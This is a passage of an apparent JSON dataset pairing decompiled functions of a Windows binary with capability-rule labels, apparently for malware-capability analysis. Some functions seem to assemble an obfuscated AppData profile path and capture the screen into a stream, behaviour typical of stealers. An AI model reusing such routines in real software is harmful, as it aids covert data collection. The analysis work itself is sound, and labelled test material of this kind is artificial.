0xffffff00;\n    do {\n        cVar1 = *puVar5;\n        puVar5 = puVar5 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(&var_11ch, puVar5 - (&var_11ch + 1));\n    var_4h = 0;\n    puVar5 = fcn.00424130(&var_74ch);\n    if (7 < puVar5[5]) {\n        puVar5 = *puVar5;\n    }\n    uVar6 = (**0x457364)(puVar5);\n    if ((uVar6 == 0xffffffff) || ((uVar6 & 0x10) != 0)) {\n        bVar2 = false;\n    }\n    else {\n        bVar2 = true;\n    }\n    if (7 < var_738h) {\n        fcn.0042d62b(var_74ch);\n    }\n    var_4h = 0xffffffff;\n    var_738h = 7;\n    var_73ch = 0;\n    var_74ch = var_74ch & 0xffff0000;\n    if (0xf < var_71ch) {\n        fcn.0042d62b(var_730h);\n    }\n    var_71ch = 0xf;\n    var_720h = 0;\n    var_730h = var_730h & 0xffffff00;\n    if (bVar2) {\n        fcn.00418aa0(&var_11ch);\n    }\n    fcn.0041acd0(0x44c726, &var_224h, in_ECX, 0, 0, *(arg_8h + 0x20), in_EDX, arg_10h);\n    if (*(arg_8h + 6) != '\\0') {\n        fcn.0041e150(arg_8h, var_758h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(in_ECX);\n    return;\n}\n",
        "token_count": 1329
    },
    "0041f2b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f2b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    int32_t unaff_EDI;\n    uint *arg_8h_00;\n    uint var_608h;\n    uint var_604h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_21ch, 0, 0x104);\n    fcn.00434d30(&var_114h, 0, 0x104);\n    fcn.00434d30(&var_604h, 0, 1000);\n    iVar1 = (**0x457500)(0, 0x1a, 0, 0, &var_604h);\n    (**0x457520)(&var_21ch, &var_604h & (iVar1 < 0) - 1);\n    (**0x457520)(&var_21ch);\n    (**0x457520)(&var_114h, &var_21ch);\n    (**0x457520)(&var_114h, 0x44f594);\n    (**0x457520)(&var_114h, L\"profi\");\n    (**0x457520)(&var_114h, L\"rofi\");\n    (**0x457520)(&var_114h, L\"ofi\");\n    (**0x457520)(&var_114h, L\"fi\");\n    (**0x457520)(&var_114h, L\"i\");\n    (**0x457520)(&var_114h, 0x44ede4);\n    (**0x457520)(&var_114h, 0x44ede8);\n    (**0x457520)(&var_114h, 0x44edf0);\n    (**0x457520)(&var_114h, 0x44f5ac);\n    arg_8h_00 = &var_114h;\n    uVar2 = (**0x457470)();\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        fcn.00413510();\n        iVar1 = fcn.0041f100();\n        if (iVar1 != 0) {\n            fcn.0041b110(0x44c726, &var_21ch, unaff_EBX, *(unaff_EDI + 0x20), arg_8h);\n        }\n        (**0x4575dc)(*0x45733c);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 624
    },
    "004201b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004201b0(code **param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = param_1[0xe];\n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (uVar2 != 0) {\n            fcn.0042d14d(0);\n            iVar3 = *(uVar2 + 4);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                *(uVar2 + 4) = iVar3 + -1;\n            }\n            iVar3 = *(uVar2 + 4);\n            fcn.0042d175();\n            puVar4 = ~-(iVar3 != 0) & uVar2;\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        fcn.0042d62b(puVar1);\n    }\n    fcn.0042d1a6();\n    return;\n}\n",
        "token_count": 284
    },
    "00421710": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00421710(code **arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4413bb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    fcn.0042d18c(uVar1);\n    var_4h = 0;\n    puVar2 = fcn.0042ddfe(4);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        uVar3 = fcn.0042d064();\n        *puVar2 = uVar3;\n        iVar4 = fcn.0042ce23();\n        fcn.0042d14d(0);\n        if (*(iVar4 + 4) != -1) {\n            *(iVar4 + 4) = *(iVar4 + 4) + 1;\n        }\n        fcn.0042d175();\n    }\n    arg_8h[4] = arg_8h + 2;\n    arg_8h[8] = arg_8h + 6;\n    arg_8h[9] = arg_8h + 7;\n    arg_8h[0xe] = puVar2;\n    arg_8h[5] = arg_8h + 3;\n    arg_8h[0xc] = arg_8h + 10;\n    arg_8h[0xd] = arg_8h + 0xb;\n    arg_8h[3] = NULL;\n    *arg_8h[9] = 0;\n    *arg_8h[0xd] = 0;\n    *arg_8h[4] = 0;\n    *arg_8h[8] = 0;\n    *arg_8h[0xc] = 0;\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 534
    },
    "00421800": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00421800(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar1 = **(in_EAX + 0x38);\n    *unaff_EDI = iVar1;\n    fcn.0042d14d(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0042d175();\n    return;\n}\n",
        "token_count": 130
    },
    "00421840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421840(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441788;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004185d0(uVar2);\n    var_4h = 0;\n    piVar3 = fcn.00421ae0();\n    var_4h = 0xffffffff;\n    if (arg_8h != 0) {\n        fcn.0042d14d(0);\n        iVar1 = *(arg_8h + 4);\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            *(arg_8h + 4) = iVar1 + -1;\n        }\n        iVar1 = *(arg_8h + 4);\n        fcn.0042d175();\n        puVar4 = ~-(iVar1 != 0) & arg_8h;\n        if (puVar4 != NULL) {\n            (***puVar4)(1);\n        }\n    }\n    (**(*piVar3 + 0x18))(arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 358
    },
    "004245a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.004245a0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (**0x4573b4)();\n    if (iVar1 != -1) {\n        iVar2 = (**0x45736c)(iVar1, &var_8h);\n        if (iVar2 != 0) {\n            (**0x4573b8)(iVar1);\n            return _var_8h;\n        }\n        (**0x4573b8)();\n    }\n    return 0;\n}\n",
        "token_count": 132
    },
    "00424840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00424840(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_ch;\n    uint unaff_EDI;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_38h = *0x4572ec;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_54h = 1;\n    iVar1 = (**0x45752c)(&var_3ch, &var_54h, 0);\n    if (iVar1 == 0) {\n        iVar1 = (**0x45748c)(0, 1, &var_2ch);\n        if (iVar1 == 0) {\n            uVar2 = (**0x457378)();\n            (**0x4575c4)(uVar2, &var_24h);\n            uVar3 = (**0x4575a0)(uVar2);\n            uVar4 = (**0x457450)(uVar3);\n            var_30h = (**0x4573bc)(uVar3, var_1ch, var_18h);\n            var_40h = (**0x45739c)(uVar4, var_30h);\n            (**0x45737c)(uVar4, 0, 0, var_1ch, var_18h, uVar3, 0, 0, 0xcc0020);\n            iVar1 = (**0x4574ec)(var_30h, 0, &var_28h);\n            if (iVar1 == 0) {\n                iVar1 = fcn.00424790(&var_14h);\n                if (iVar1 != -1) {\n                    iVar1 = (**0x4574c0)(var_28h, var_2ch, &var_14h, 0);\n                    if (iVar1 == 0) {\n                        (**0x457388)(var_2ch, &var_34h);\n                        var_44h = (**0x4573cc)(var_34h);\n                        arg_ch = (**0x457360)(var_34h);\n                        fcn.0042ca60(var_44h, arg_ch);\n                        (**0x45739c)(uVar4, var_40h);\n                        (**0x457400)(var_28h);\n                        (**0x45750c)(var_3ch);\n                        (**0x457538)(var_30h);\n                        (**0x457538)(uVar4);\n                        (**0x457524)(uVar2, uVar3);\n                        (**0x457594)(uVar2);\n                    }\n                }\n            }\n        }\n    }\n    fcn.0042d636(unaff_EDI);\n    return;\n}\n",
        "token_count": 747
    },
    "0042b880": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0042b880(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    \n    *(unaff_ESI + 0x7c) = 0;\n    *(unaff_ESI + 0x84) = 0;\n    *(unaff_ESI + 0x80) = 0;\n    *(unaff_ESI + 0x78) = 0;\n    *(unaff_ESI + 0x70) = 0;\n    *(unaff_ESI + 0x90) = 0;\n    *(unaff_ESI + 0x74) = 0;\n    if (in_EAX == 0) {\n        return 0x10000;\n    }\n    iVar1 = (**0x4573b4)();\n    if (iVar1 == -1) {\n        return 0x200;\n    }\n    iVar2 = fcn.0042b900(0);\n    if (iVar2 != 0) {\n        (**0x4573b8)(iVar1);\n        return iVar2;\n    }\n    *(unaff_ESI + 0x80) = 1;\n    return 0;\n}\n",
        "token_count": 276
    },
    "0042b900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042b900(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    int32_t unaff_EBX;\n    ulong uVar4;\n    uint arg_8h_00;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    *(unaff_EBX + 0x7c) = 0;\n    *(unaff_EBX + 0x84) = 0;\n    *(unaff_EBX + 0x80) = 0;\n    *(unaff_EBX + 0x78) = 0;\n    *(unaff_EBX + 0x70) = 0;\n    *(unaff_EBX + 0x90) = 0;\n    *(unaff_EBX + 0x74) = 0;\n    if ((in_ECX != 0) && (in_ECX != -1)) {\n        iVar1 = (**0x4573d0)(*(unaff_EBX + 4), 0, 0, 1);\n        if (iVar1 == -1) {\n            *(unaff_EBX + 0x4c) = 0x80000000;\n            *(unaff_EBX + 0x70) = 0xffffffff;\n            if (arg_8h != 0) {\n                *(unaff_EBX + 0x70) = arg_8h;\n            }\n            *(unaff_EBX + 0x6c) = 0;\n            (**0x4574a8)(&var_18h);\n            (**0x4574c4)(&var_18h, &var_28h);\n            fcn.0042b2f0(var_28h);\n            arg_8h_00 = 10000000;\n            uVar4 = fcn.00436c90(var_28h + 0x2ac18000, (var_24h + -0x19db1de) - (var_28h < 0xd53e8000), 10000000, 0);\n            uVar3 = uVar4 >> 0x20;\n            uVar2 = uVar4;\n            *(unaff_EBX + 0x54) = uVar3;\n            *(unaff_EBX + 0x50) = uVar2;\n            *(unaff_EBX + 0x58) = uVar2;\n            *(unaff_EBX + 0x60) = uVar2;\n            *(unaff_EBX + 0x5c) = uVar3;\n            *(unaff_EBX + 100) = uVar3;\n            *(unaff_EBX + 0x68) = CONCAT22(var_20h, var_1ch);\n            *(unaff_EBX + 0x7c) = in_ECX;\n            fcn.0042d636(arg_8h_00);\n            return;\n        }\n        iVar1 = fcn.0042b360(in_ECX, unaff_EBX + 0x4c, unaff_EBX + 0x50);\n        if (iVar1 == 0) {\n            (**0x4573d0)();\n            *(unaff_EBX + 0x6c) = 1;\n            *(unaff_EBX + 0x7c) = in_ECX;\n            fcn.0042d636(iVar1);\n            return;\n        }\n    }\n    fcn.0042d636(in_ECX);\n    return;\n}\n",
        "token_count": 869
    },
    "0042bec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0042bec0(void)\n\n{\n    int32_t arg_ch;\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    arg_ch = fcn.0042bcb0();\n    while ((arg_ch != 0 && (arg_ch != -1))) {\n        iVar1 = fcn.0042b670(unaff_EDI + 0x94, arg_ch);\n        if (iVar1 != arg_ch) {\n            return 0x60000;\n        }\n        var_4h = var_4h + arg_ch;\n        arg_ch = fcn.0042bcb0();\n    }\n    *(unaff_EDI + 0x90) = var_4h;\n    return 0;\n}\n",
        "token_count": 181
    },
    "0042e468": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042e468(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450a68, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.00431723();\n        *puVar3 = 0x16;\n        fcn.004330e7();\n        goto code_r0x0042e553;\n    }\n    fcn.0042e63b(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00435574(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x454e00;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x468060);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x454e00;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x468060);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x0042e51e;\n        }\n        puVar3 = fcn.00431723();\n        *puVar3 = 0x16;\n        fcn.004330e7();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0042e51e:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00432df9(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0042e55c();\ncode_r0x0042e553:\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 800
    },
    "0042ec9a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ec9a(uint arg_8h)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t **arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450b10, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == NULL) {\n        puVar2 = fcn.00431723();\n        *puVar2 = 0x16;\n        fcn.004330e7();\n        goto code_r0x0042ed7d;\n    }\n    fcn.0042e63b(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar3 = fcn.00435574(arg_8h_00);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar4 = 0x454e00;\n        }\n        else {\n            iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x468060);\n        }\n        if ((*(iVar4 + 0x24) & 0x7f) == 0) {\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                iVar4 = 0x454e00;\n            }\n            else {\n                iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x468060);\n            }\n            if ((*(iVar4 + 0x24) & 0x80) == 0) goto code_r0x0042ed50;\n        }\n        puVar2 = fcn.00431723();\n        *puVar2 = 0x16;\n        fcn.004330e7();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0042ed50:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar3 = fcn.004365fc(arg_8h_00);\n        }\n        else {\n            uVar3 = **arg_8h_00;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0042ed86();\ncode_r0x0042ed7d:\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 754
    },
    "0040b790": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040b790(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint8_t **arg_1ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uchar *puVar16;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint8_t *var_8h;\n    uint8_t *var_4h;\n    \n    var_8h = arg_1ch[1];\n    var_4h = *arg_1ch;\n    uVar15 = *(arg_18h + 0x20);\n    uVar6 = *(arg_18h + 0x1c);\n    puVar16 = *(arg_18h + 0x34);\n    if (puVar16 < *(arg_18h + 0x30)) {\n        var_ch = *(arg_18h + 0x30) + (-1 - puVar16);\n    }\n    else {\n        var_ch = *(arg_18h + 0x2c) - puVar16;\n    }\n    uVar12 = *(arg_8h * 4 + 0x44d068);\n    uVar5 = *(arg_ch * 4 + 0x44d068);\n    do {\n        for (; uVar6 < 0x14; uVar6 = uVar6 + 8) {\n            uVar3 = *var_4h;\n            var_8h = var_8h + -1;\n            var_4h = var_4h + 1;\n            uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n        }\n        uVar7 = uVar12 & uVar15;\n        uVar3 = *(arg_10h + uVar7 * 8);\n        uVar14 = uVar3;\n        iVar13 = arg_10h + uVar7 * 8;\n        uVar4 = *(iVar13 + 1);\n        uVar15 = uVar15 >> (uVar4 & 0x1f);\n        if (uVar14 == 0) {\ncode_r0x0040b9bc:\n            uVar6 = uVar6 - uVar4;\n            *puVar16 = *(iVar13 + 4);\n            puVar16 = puVar16 + 1;\n            var_ch = var_ch + -1;\n        }\n        else {\n            uVar6 = uVar6 - *(iVar13 + 1);\n            while ((uVar3 & 0x10) == 0) {\n                if ((uVar14 & 0x40) != 0) {\n                    if ((uVar14 & 0x20) != 0) {\n                        uVar12 = arg_1ch[1] - var_8h;\n                        if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                            uVar12 = uVar6 >> 3;\n                        }\n                        *(arg_18h + 0x20) = uVar15;\n                        *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n                        arg_1ch[1] = var_8h + uVar12;\n                        puVar1 = *arg_1ch;\n                        *arg_1ch = var_4h + -uVar12;\n                        arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n                        *(arg_18h + 0x34) = puVar16;\n                        return 1;\n                    }\n                    arg_1ch[6] = \"invalid literal/length code\";\n                    goto code_r0x0040ba86;\n                }\n                iVar8 = (*(uVar14 * 4 + 0x44d068) & uVar15) + *(iVar13 + 4);\n                uVar3 = *(iVar13 + iVar8 * 8);\n                uVar14 = uVar3;\n                iVar13 = iVar13 + iVar8 * 8;\n                uVar4 = *(iVar13 + 1);\n                uVar15 = uVar15 >> (uVar4 & 0x1f);\n                if (uVar14 == 0) goto code_r0x0040b9bc;\n                uVar6 = uVar6 - *(iVar13 + 1);\n            }\n            uVar14 = uVar14 & 0xf;\n            uVar7 = (*(uVar14 * 4 + 0x44d068) & uVar15) + *(iVar13 + 4);\n            uVar15 = uVar15 >> uVar14;\n            for (uVar6 = uVar6 - uVar14; uVar6 < 0xf; uVar6 = uVar6 + 8) {\n                uVar3 = *var_4h;\n                var_8h = var_8h + -1;\n                var_4h = var_4h + 1;\n                uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n            }\n            puVar1 = arg_14h + (uVar5 & uVar15) * 8;\n            uVar15 = uVar15 >> (puVar1[1] & 0x1f);\n            uVar6 = uVar6 - puVar1[1];\n            uVar3 = *puVar1;\n            while ((uVar3 & 0x10) == 0) {\n                if ((uVar3 & 0x40) != 0) {\n                    arg_1ch[6] = \"invalid distance code\";\ncode_r0x0040ba86:\n                    uVar12 = arg_1ch[1] - var_8h;\n                    if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                        uVar12 = uVar6 >> 3;\n                    }\n                    *(arg_18h + 0x20) = uVar15;\n                    *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n                    arg_1ch[1] = var_8h + uVar12;\n                    puVar1 = *arg_1ch;\n                    *arg_1ch = var_4h + -uVar12;\n                    arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n                    *(arg_18h + 0x34) = puVar16;\n                    return 0xfffffffd;\n                }\n                iVar13 = (*(uVar3 * 4 + 0x44d068) & uVar15) + *(puVar1 + 4);\n                puVar2 = puVar1 + iVar13 * 8 + 1;\n                puVar1 = puVar1 + iVar13 * 8;\n                uVar15 = uVar15 >> (*puVar2 & 0x1f);\n                uVar6 = uVar6 - *puVar2;\n                uVar3 = *puVar1;\n            }\n            uVar14 = uVar3 & 0xf;\n            for (; uVar6 < uVar14; uVar6 = uVar6 + 8) {\n                uVar3 = *var_4h;\n                var_8h = var_8h + -1;\n                var_4h = var_4h + 1;\n                uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n            }\n            uVar9 = *(uVar14 * 4 + 0x44d068) & uVar15;\n            var_ch = var_ch + -uVar7;\n            uVar15 = uVar15 >> uVar14;\n            uVar6 = uVar6 - uVar14;\n            puVar11 = *(arg_18h + 0x28);\n            puVar10 = puVar16 + -(uVar9 + *(puVar1 + 4));\n            if (puVar10 < puVar11) {\n                do {\n                    puVar10 = puVar10 + (*(arg_18h + 0x2c) - puVar11);\n                } while (puVar10 < puVar11);\n                arg_8h = *(arg_18h + 0x2c) - puVar10;\n                if (arg_8h < uVar7) {\n                    iVar13 = uVar7 - arg_8h;\n                    do {\n                        *puVar16 = *puVar10;\n                        puVar16 = puVar16 + 1;\n                        puVar10 = puVar10 + 1;\n                        arg_8h = arg_8h - 1;\n                    } while (arg_8h != 0);\n                    puVar11 = *(arg_18h + 0x28);\n                    do {\n                        *puVar16 = *puVar11;\n                        puVar16 = puVar16 + 1;\n                        puVar11 = puVar11 + 1;\n                        iVar13 = iVar13 + -1;\n                    } while (iVar13 != 0);\n                }\n                else {\n                    *puVar16 = *puVar10;\n                    puVar16[1] = puVar10[1];\n                    puVar16 = puVar16 + 2;\n                    puVar10 = puVar10 + 2;\n                    iVar13 = uVar7 - 2;\n                    do {\n                        *puVar16 = *puVar10;\n                        puVar16 = puVar16 + 1;\n                        puVar10 = puVar10 + 1;\n                        iVar13 = iVar13 + -1;\n                    } while (iVar13 != 0);\n                }\n            }\n            else {\n                *puVar16 = *puVar10;\n                puVar16[1] = puVar10[1];\n                puVar16 = puVar16 + 2;\n                puVar10 = puVar10 + 2;\n                iVar13 = uVar7 - 2;\n                do {\n                    *puVar16 = *puVar10;\n                    puVar16 = puVar16 + 1;\n                    puVar10 = puVar10 + 1;\n                    iVar13 = iVar13 + -1;\n                } while (iVar13 != 0);\n            }\n        }\n        if ((var_ch < 0x102) || (var_8h < 0xa)) {\n            uVar12 = arg_1ch[1] - var_8h;\n            if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                uVar12 = uVar6 >> 3;\n            }\n            *(arg_18h + 0x20) = uVar15;\n            *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n            arg_1ch[1] = var_8h + uVar12;\n            puVar1 = *arg_1ch;\n            *arg_1ch = var_4h + -uVar12;\n            arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n            *(arg_18h + 0x34) = puVar16;\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 2634
    },
    "004292d0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004292d0(int32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    uVar2 = *(in_ECX + 2);\n    iVar4 = 0;\n    var_8h = 0xffffffff;\n    iVar3 = 7;\n    iVar7 = 4;\n    if (uVar2 == 0) {\n        iVar3 = 0x8a;\n        iVar7 = 3;\n    }\n    *(in_ECX + 6 + in_EAX * 4) = 0xffff;\n    if (-1 < in_EAX) {\n        var_4h = in_ECX + 6;\n        var_ch = in_EAX + 1;\n        uVar5 = uVar2;\n        do {\n            uVar6 = *var_4h;\n            iVar4 = iVar4 + 1;\n            if ((iVar3 <= iVar4) || (uVar5 != uVar6)) {\n                if (iVar4 < iVar7) {\n                    piVar1 = arg_8h + 0xef4 + uVar5 * 4;\n                